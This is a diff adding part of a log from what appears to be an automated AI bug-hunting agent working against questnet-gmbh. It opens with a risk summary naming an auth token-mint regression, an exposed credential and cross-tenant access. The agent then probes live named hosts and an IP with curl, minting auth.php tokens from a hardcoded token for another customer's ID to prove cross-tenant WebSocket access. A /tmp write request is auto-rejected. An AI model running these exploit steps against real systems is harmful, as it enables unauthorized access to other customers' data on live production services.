@@ -29942,3 +29942,140 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] questnet-gmbh: 82 — auth.php mint regression un-mitigated on day 3 fully re-arms the chain (anonymous per-cid live-debug token → cbs-proxy misbind); fresh three-context byte-identical WS stream including nonexistent cid 999999999 proves connection-layer cid/token agnosticism and sustains driver 8.6 (9.1 gated only by operator two-tenant backend-binding test). Report set: auth.php mint 7.5 REGRESSED un-mitigated, help.js credential 7.5, voicenote PII 7.5 (UUID-blocked), get_user_rights 6.5 ciphertext, driver BOLA HOLD 8.6, XSS HUMAN_ONLY MED/HIGH chained. No new anonymous lever opened this cycle — everything else byte-stable or denial-gated; risk flat-to-slightly-up from 80.
+===== ANALYST bigpickle 2026-09-18 21:18:03 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls /home/runner/work/questnet-gmbh-hunt/questnet-gmbh-hunt 2>/dev/null && ls ./art 2>/dev/null | head -50
+README.md
+analyst-out.txt
+analyst-prompt.txt
+ctx.txt
+inventory
+knowledge
+leads
+probe-results.md
+recon-notes
+reports
+reposcan-raw
+scope.yml
+scripts
+state_bigpickle.json
+state_laguna.json
+state_ling3.json
+state_longcat.json
+state_mimo.json
+state_nemotron3.json
+triage
+[0m
+[0m$ [0mls ./leads ./knowledge ./probe-results.md ./inventory 2>/dev/null; echo ---; cat ./state_bigpickle.json 2>/dev/null | head -20
+./probe-results.md
+
+./inventory:
+questnet-gmbh.md
+
+./knowledge:
+index.md
+
+./leads:
+lead-bigpickle.md
+lead-laguna.md
+lead-ling3.md
+lead-longcat.md
+lead-mimo.md
+lead-nemotron3.md
+reposcan-questnet-gmbh.md
+---
+{"phase": "POC", "target": "api"}
+[0m
+[0m$ [0mgit log --oneline -8 2>/dev/null; echo ---; git status --short 2>/dev/null | head
+bccdab0 reposcan 2026-09-18-19-43
+---
+?? analyst-out.txt
+?? analyst-prompt.txt
+?? ctx.txt
+[0m
+[0m$ [0mtail -60 ./probe-results.md 2>/dev/null
+## 2026-09-15 16:42:27 UTC
+
+
+## 2026-09-15 19:58:35 UTC
+
+
+## 2026-09-15 23:01:16 UTC
+
+
+## 2026-09-16 01:17:16 UTC
+
+
+## 2026-09-16 06:15:13 UTC
+
+
+## 2026-09-16 11:52:09 UTC
+
+
+## 2026-09-16 16:37:36 UTC
+
+
+## 2026-09-16 20:03:07 UTC
+
+
+## 2026-09-16 22:48:32 UTC
+
+
+## 2026-09-17 01:14:59 UTC
+
+
+## 2026-09-17 06:21:24 UTC
+
+
+## 2026-09-17 11:56:38 UTC
+
+
+## 2026-09-17 16:41:21 UTC
+
+
+## 2026-09-17 19:55:02 UTC
+
+
+## 2026-09-17 22:47:33 UTC
+
+
+## 2026-09-18 01:12:01 UTC
+
+
+## 2026-09-18 06:08:34 UTC
+
+
+## 2026-09-18 11:38:39 UTC
+
+
+## 2026-09-18 15:16:14 UTC
+
+
+## 2026-09-18 18:40:35 UTC
+[0m
+[0m$ [0mwhich curl websocat python3 jq 2>/dev/null; python3 -c "import websockets" 2>&1 | head -1; ls ./scripts 2>/dev/null
+/usr/bin/curl
+/usr/bin/python3
+/usr/bin/jq
+Traceback (most recent call last):
+sync-issues.py
+[0m
+[0m$ [0mfor h in www.applicationdesigner.de cbs-proxy.api.live-manager.de; do echo "$h -> $(getent hosts $h | awk '{print $1}' | tr '\n' ' ')"; done; curl -s -o /dev/null -w "appdesigner %{http_code} %{size_download}B %{time_total}s\n" https://www.applicationdesigner.de/help.js --max-time 25; curl -s -o /dev/null -w "cbs-proxy non-upgrade %{http_code} %{size_download}B %{time_total}s\n" -H "Host: cbs-proxy.api.live-manager.de" "https://185.158.98.53/?origin=LiveDemo&cid=2&service=100" -k --max-time 25
+www.applicationdesigner.de -> 185.158.98.53 
+cbs-proxy.api.live-manager.de -> 185.158.98.53 
+appdesigner 200 3290201B 2.517571s
+cbs-proxy non-upgrade 426 0B 0.458054s
+[0m
+[93m[1m! [0mpermission requested: external_directory (/tmp/*); auto-rejecting
+[0m✗ [0mTOKEN=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3
+echo "== no-token control =="
+curl -s -w "\nHTTP %{http_code} %{size_download}B\n" "https://www.applicationdesigner.de/extjs/livedebugger/auth.php?customer_id=2&srn=100" --max-time 25 > /tmp/ctl1.txt
+cat /tmp/ctl1.txt
+sleep 2
+echo "== mint cid=2 =="
+curl -s -w "\nHTTP %{http_code} %{size_download}B\n" "https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=$TOKEN&customer_id=2&srn=100" --max-time 25 > /tmp/mint2.txt
+cat /tmp/mint2.txt failed
+[91m[1mError: [0mThe user rejected permission to use this specific tool call.
+Both hosts live, driver confirmed (426/0B). Running a fresh read-only probe cycle to re-prove the auth.php mint regression and tie a fresh minted token to a foreign-cid WS upgrade — the missing pairwise evidence for the driver.
